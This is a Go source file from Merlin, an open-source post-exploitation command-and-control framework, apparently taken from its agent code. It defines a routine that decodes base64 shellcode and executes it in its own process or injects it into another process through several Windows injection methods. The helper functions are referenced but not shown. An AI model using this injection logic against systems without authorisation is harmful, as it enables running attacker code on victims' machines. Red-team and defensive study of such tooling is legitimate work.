// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2021  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package commands

import (
	// Standard
	"encoding/base64"
	"fmt"

	// Internal
	"github.com/Ne0nd0g/merlin/pkg/agent/cli"
	"github.com/Ne0nd0g/merlin/pkg/jobs"
)

// ExecuteShellcode instructs the agent to load and run shellcode according to the input job
func ExecuteShellcode(cmd jobs.Shellcode) jobs.Results {
	var results jobs.Results

	cli.Message(cli.DEBUG, fmt.Sprintf("Received input parameter for executeShellcode function: %+v", cmd))

	shellcodeBytes, errDecode := base64.StdEncoding.DecodeString(cmd.Bytes)

	if errDecode != nil {
		results.Stderr = fmt.Sprintf("there was an error decoding the shellcode Base64 string:\r\n%s", errDecode)
		cli.Message(cli.WARN, results.Stderr)
		return results
	}

	cli.Message(cli.INFO, fmt.Sprintf("Shelcode execution method: %s", cmd.Method))
	cli.Message(cli.INFO, fmt.Sprintf("Executing shellcode %x", shellcodeBytes))

	switch cmd.Method {
	case "self":
		err := ExecuteShellcodeSelf(shellcodeBytes)
		if err != nil {
			results.Stderr = fmt.Sprintf("there was an error executing shellcode with the \"self\" method:\r\n%s", err)
		}
	case "remote":
		err := ExecuteShellcodeRemote(shellcodeBytes, cmd.PID)
		if err != nil {
			results.Stderr = fmt.Sprintf("there was an error executing shellcode with the \"remote\" method:\r\n%s", err)
		}
	case "rtlcreateuserthread":
		err := ExecuteShellcodeRtlCreateUserThread(shellcodeBytes, cmd.PID)
		if err != nil {
			results.Stderr = fmt.Sprintf("there was an error executing shellcode with the \"rtlcreateuserthread\" method:\r\n%s", err)
		}
	case "userapc":
		err := ExecuteShellcodeQueueUserAPC(shellcodeBytes, cmd.PID)
		if err != nil {
			results.Stderr = fmt.Sprintf("there was an error executing shellcode with the \"userapc\" method:\r\n%s", err)
		}
	default:
		results.Stderr = fmt.Sprintf("invalid shellcode execution method: %s", cmd.Method)
	}
	if results.Stderr == "" {
		results.Stdout = fmt.Sprintf("Shellcode %s method successfully executed", cmd.Method)
	}

	if results.Stderr == "" {
		cli.Message(cli.SUCCESS, results.Stdout)
	} else {
		cli.Message(cli.WARN, results.Stderr)
	}
	return results
}
